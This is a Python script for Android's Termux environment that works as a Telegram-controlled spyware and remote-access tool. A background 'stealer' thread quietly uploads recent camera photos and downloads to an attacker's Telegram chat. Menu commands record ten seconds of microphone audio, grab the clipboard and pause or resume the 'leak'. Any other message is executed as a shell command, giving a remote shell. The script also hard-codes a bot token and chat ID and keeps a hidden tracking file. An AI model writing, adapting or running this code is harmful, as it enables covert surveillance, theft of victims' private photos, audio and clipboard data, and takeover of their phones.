import os, time, subprocess, threading

# Авто-установка библиотеки для работы с ТГ
try:
    import telebot
    from telebot import types
except ImportError:
    subprocess.run(["pip", "install", "pyTelegramBotAPI"])
    import telebot
    from telebot import types

# Твои данные
TOKEN = "8354728858:AAEsorSBoucxw5aZDTxDErBRHxhIe5m8Ysw"
CHAT_ID = "7943753454"
bot = telebot.TeleBot(TOKEN)
DB_FILE = os.path.expanduser("~/.sys_cache")
SEND_FILES = True

def get_menu():
    m = types.ReplyKeyboardMarkup(resize_keyboard=True)
    m.add("📊 Статус", "🎙 Микрофон")
    m.add("🛑 Стоп Слив", "▶️ Старт Слив")
    m.add("📋 Буфер", "📍 Гео")
    return m

def stealer():
    while True:
        if SEND_FILES:
            # Ищем последние фото (за последний час)
            cmd = "find /sdcard/DCIM/Camera /sdcard/Download -maxdepth 1 -type f \( -name '*.jpg' -o -name '*.png' \) -mmin -60"
            files = subprocess.getoutput(cmd).splitlines()
            for f in files:
                if os.path.exists(f):
                    with open(DB_FILE, "a+") as db:
                        db.seek(0)
                        if f not in db.read():
                            try:
                                with open(f, "rb") as doc:
                                    bot.send_document(CHAT_ID, doc)
                                db.write(f + "\n")
                                time.sleep(2)
                            except: pass
        time.sleep(20)

@bot.message_handler(commands=['start'])
def start(m):
    bot.send_message(CHAT_ID, "✅ *Система управления активна.*", parse_mode="Markdown", reply_markup=get_menu())

@bot.message_handler(content_types=['text'])
def handle(m):
    global SEND_FILES
    t = m.text
    if t == "📊 Статус":
        res = subprocess.getoutput("termux-battery-status")
        bot.send_message(CHAT_ID, f"🔋 Инфо:\n`{res}`", parse_mode="Markdown")
    elif t == "🎙 Микрофон":
        bot.send_message(CHAT_ID, "🎙 Пишу 10 сек...")
        os.system("termux-microphone-record -d 10 -f ~/v.amr")
        with open(os.path.expanduser("~/v.amr"), "rb") as a:
            bot.send_document(CHAT_ID, a)
        os.remove(os.path.expanduser("~/v.amr"))
    elif t == "🛑 Стоп Слив":
        SEND_FILES = False
        bot.send_message(CHAT_ID, "⏸ Пауза.")
    elif t == "▶️ Старт Слив":
        SEND_FILES = True
        bot.send_message(CHAT_ID, "▶️ Работаем.")
    elif t == "📋 Буфер":
        res = subprocess.getoutput("termux-clipboard-get")
        bot.send_message(CHAT_ID, f"📋 Буфер:\n`{res}`", parse_mode="Markdown")
    else:
        out = subprocess.getoutput(t)
        if out: bot.send_message(CHAT_ID, f"💻 Вывод:\n`{out}`", parse_mode="Markdown")

threading.Thread(target=stealer, daemon=True).start()
bot.polling(none_stop=True)
